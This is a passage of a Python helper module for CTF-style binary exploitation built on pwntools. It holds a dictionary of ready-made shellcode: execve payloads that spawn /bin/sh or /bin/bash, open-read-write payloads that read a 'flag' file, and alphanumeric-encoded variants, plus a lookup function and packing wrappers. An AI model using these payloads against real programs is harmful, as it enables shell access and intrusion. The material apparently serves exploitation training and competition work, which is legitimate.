    "execve_x86": b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80',
    "execve_x64": b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05',
    "execveat_x64": b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05',
    "execve_binsh_x64": b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05',
    "orw_x64": b'\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05',
    "orw_x86": b'\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80',
    "alpha3_x64": b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t',
    "alpha3_x86": b'hffffk4diFkTpj02Tpk0T0AuEE2O0Z2G7O0u7M041o1P0R7L0Y3T3C1l000n000Q4q0f2s7n0Y0X020e3j2r1k0h0i013A7o4y3A114C1n0z0h4k4r0s',
    "ae64": b'WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP',
}


def get_shellcode(type='execve'):
    """
    返回现有的 Shellcode

    execve, orw, alpha3, ae64
    Args:
        type: Shellcode 类型，默认 execve

    Returns:
        shellcode
    """
    global arch

    color = random_color()

    shellcode_key = f"{type}_{'x64' if arch == Arch.x64 else 'x86'}"
    if shellcode_key in shellcode_list:
        _colorful_print(f"Try get shellcode from shellcode list with type:{type}, Arch:{arch}", color)
        _colorful_print(f"Shellcode: {shellcode_list[shellcode_key]}", color)
        return shellcode_list[shellcode_key]
    elif type in shellcode_list:
        _colorful_print(f"Try get shellcode from shellcode list with type:{type}, Arch:{arch}", color)
        _colorful_print(f"Shellcode: {shellcode_list[type]}", color)
        return shellcode_list[type]
    
    raise ValueError(f"Unsupported shellcode type:{type} or architecture:{arch}.")


def p64(
    number: int,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Packs integer into wordsize of 64.

    endianness and signedness is done according to context.

    Arguments:
        number (int): Number to convert
        endianness (str): Endianness of the converted integer ("little"/"big")
        sign (bool): Signedness of the converted integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The packed number as a byte.
    """
    return pwnlib.util.packing.p64(number, endianness=endianness, sign=sign, **kwargs)


def p32(
    number: int,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Packs integer into wordsize of 32.

    endianness and signedness is done according to context.

    Arguments:
        number (int): Number to convert
        endianness (str): Endianness of the converted integer ("little"/"big")
        sign (bool): Signedness of the converted integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The packed number as a byte.
    """
    return pwnlib.util.packing.p32(number, endianness=endianness, sign=sign, **kwargs)


def p16(
    number: int,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Packs integer into wordsize of 16.

    endianness and signedness is done according to context.

    Arguments:
        number (int): Number to convert
        endianness (str): Endianness of the converted integer ("little"/"big")
        sign (bool): Signedness of the converted integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The packed number as a byte.
    """
    return pwnlib.util.packing.p16(number, endianness=endianness, sign=sign, **kwargs)


def p8(
    number: int,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Packs integer into wordsize of 8.

    endianness and signedness is done according to context.

    Arguments:
        number (int): Number to convert
        endianness (str): Endianness of the converted integer ("little"/"big")
        sign (bool): Signedness of the converted integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The packed number as a byte.
    """
    return pwnlib.util.packing.p8(number, endianness=endianness, sign=sign, **kwargs)


def u64(
    data: bytes,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Unpacks 64-bit integer from data.

    endianness and signedness is done according to context.

    Arguments:
        data (bytes): Data to unpack from
        endianness (str): Endianness of the integer ("little"/"big")
        sign (bool): Signedness of the integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The unpacked integer.
    """
    return pwnlib.util.packing.u64(data, endianness=endianness, sign=sign, **kwargs)


def u32(
    data: bytes,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Unpacks 32-bit integer from data.

    endianness and signedness is done according to context.

    Arguments:
        data (bytes): Data to unpack from
        endianness (str): Endianness of the integer ("little"/"big")
        sign (bool): Signedness of the integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The unpacked integer.
    """
    return pwnlib.util.packing.u32(data, endianness=endianness, sign=sign, **kwargs)


def u16(
    data: bytes,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Unpacks 16-bit integer from data.

    endianness and signedness is done according to context.

    Arguments:
        data (bytes): Data to unpack from
        endianness (str): Endianness of the integer ("little"/"big")
        sign (bool): Signedness of the integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The unpacked integer.
    """
    return pwnlib.util.packing.u16(data, endianness=endianness, sign=sign, **kwargs)


def u8(
    data: bytes,
    endianness: Literal["little", "big"] = None,
    sign: bool = None,
    **kwargs: Any,
):
    """
    Unpacks 8-bit integer from data.

    endianness and signedness is done according to context.

    Arguments:
        data (bytes): Data to unpack from
        endianness (str): Endianness of the integer ("little"/"big")
        sign (bool): Signedness of the integer (False/True)
        kwargs: Anything that can be passed to context.local

    Returns:
        The unpacked integer.
    """
    return pwnlib.util.packing.u8(data, endianness=endianness, sign=sign, **kwargs)


class FileStruct(ctypes.Structure):
    _fields_ = [
        ('field1', ctypes.c_int),
        ('field2', ctypes.c_int),
        ('field3', ctypes.c_char * 10)
    ]


class Arch(Enum):
    x86 = 0,
    x64 = 1,
    Null = 255,


class CheckStatement(Enum):
    Normal = 0,
    Missing = 1,
    Null = 255,


class SocketStatus(Enum):
    Local = 0,
    Remote = 1,
    Null = 255,
